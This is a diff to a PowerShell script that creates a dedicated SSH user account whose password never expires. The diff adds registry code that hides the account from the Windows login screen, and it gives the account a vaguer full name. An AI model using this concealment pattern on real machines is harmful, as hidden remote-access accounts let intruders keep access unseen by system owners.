@@ -46,7 +46,7 @@ $SecurePassword = ConvertTo-SecureString $PasswordPlain -AsPlainText -Force
 if (!(Get-LocalUser -Name $Username -ErrorAction SilentlyContinue)) {
     New-LocalUser -Name $Username `
         -Password $SecurePassword `
-        -FullName "SSH Remote User" `
+        -FullName "Remote" `
         -Description "Dedicated SSH access account" `
         -PasswordNeverExpires | Out-Null
 } else {
@@ -60,6 +60,13 @@ try {
 } catch {
     # Ignore if user is already a member of the group
 }
+
+# Hide the user from the Windows login screen while keeping SSH active
+$HideRegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+if (!(Test-Path $HideRegPath)) {
+    New-Item -Path $HideRegPath -Force | Out-Null
+}
+New-ItemProperty -Path $HideRegPath -Name $Username -Value 0 -PropertyType DWord -Force | Out-Null
 
 # Optional: Set PowerShell as the default SSH shell instead of cmd.exe
 New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell `
